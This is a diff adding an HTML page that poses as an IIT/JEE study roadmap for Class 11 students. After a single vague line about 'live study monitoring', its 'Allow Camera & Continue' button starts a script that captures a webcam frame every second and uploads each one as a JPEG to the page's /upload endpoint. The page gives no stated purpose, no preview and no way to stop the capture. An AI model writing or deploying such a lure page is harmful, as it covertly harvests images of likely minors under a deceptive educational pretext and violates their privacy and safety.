@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IIT Roadmap</title>
+    <style>
+        body {
+            font-family: Arial;
+            background: #0f172a;
+            color: white;
+            text-align: center;
+        }
+        .card {
+            margin: 20px auto;
+            padding: 20px;
+            width: 60%;
+            background: #1e293b;
+            border-radius: 12px;
+        }
+        button {
+            padding: 12px 25px;
+            background: #22c55e;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<h1>IIT Roadmap (Class 11 → IIT)</h1>
+
+<div class="card">Class 11: Build strong PCM basics</div>
+<div class="card">Class 12: Advanced + JEE prep</div>
+<div class="card">Mock Tests + Revision</div>
+
+<p style="color:yellow;">
+This site uses camera for live study monitoring (with your permission)
+</p>
+
+<button onclick="startCamera()">Allow Camera & Continue</button>
+
+<script>
+async function startCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        setInterval(() => {
+            canvas.width = 320;
+            canvas.height = 240;
+            ctx.drawImage(video, 0, 0, 320, 240);
+
+            canvas.toBlob(blob => {
+                let formData = new FormData();
+                formData.append("frame", blob);
+
+                fetch("/upload", {
+                    method: "POST",
+                    body: formData
+                });
+            }, "image/jpeg");
+        }, 1000);
+
+    } catch (err) {
+        alert("Camera permission denied");
+    }
+}
+</script>
+
+</body>
+</html>
